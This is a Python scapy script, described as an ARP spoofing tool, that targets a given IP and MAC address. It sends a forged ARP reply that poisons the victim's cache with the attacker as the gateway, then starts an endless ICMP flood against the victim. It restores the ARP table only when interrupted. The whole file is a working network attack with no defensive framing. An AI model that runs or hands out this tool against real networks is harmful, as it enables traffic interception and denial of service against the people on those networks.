#!/usr/bin/env python3
from scapy.all import *
import time
import argparse
from scapy.layers.inet import ICMP, IP
from scapy.layers.l2 import ARP, Ether
import netifaces
import threading

def get_gateway_info():
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET]
    gateway_ip = default_gateway[0]
    iface = default_gateway[1]

    arp_req = ARP(pdst=gateway_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_req
    result = srp(packet, iface=iface, timeout=2, verbose=0)[0]

    gateway_mac = None
    for sent, received in result:
        gateway_mac = received.hwsrc
        break

    return gateway_ip, gateway_mac, iface

def icmp_flood(target_ip, iface):
    print(f"[⚡] Starting ICMP flood on {target_ip} via {iface}...")
    while True:
        packet = IP(dst=target_ip)/ICMP()/Raw(load="X"*600)
        send(packet, iface=iface, verbose=0)


def spoof(target_IP, spoof_ip, target_MAC):
    packet = ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(dest_ip, src_ip, dest_mac, src_mac):
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    send(packet, count=4, verbose=False)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoofing tool")
    parser.add_argument("-t", "--target-ip", help="Target IP address", type=str)
    parser.add_argument("-m", "--target-mac", help="Target MAC address", type=str)
    args = parser.parse_args()



    target_IP = args.target_ip
    target_MAC = args.target_mac
    gateway_ip, gateway_mac, iface = get_gateway_info()
    print(f"[INPUT] Provided target: IP: {target_IP}, MAC: {target_MAC}")


    try:
        print("\nStarting ARP spoofing attack...")
        spoof(target_IP, gateway_ip, target_MAC)
        print(f"Victim {target_IP} is now spoofed.")

        flood_thread = threading.Thread(target=icmp_flood, args=(target_IP, iface), daemon=True)
        flood_thread.start()

        print("Press Ctrl+C to stop the attack and restore ARP tables.")
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nInterrupted by user. Restoring ARP...")
        restore(target_IP, gateway_ip, target_MAC, gateway_mac)
        print("ARP table restored. Exiting.")

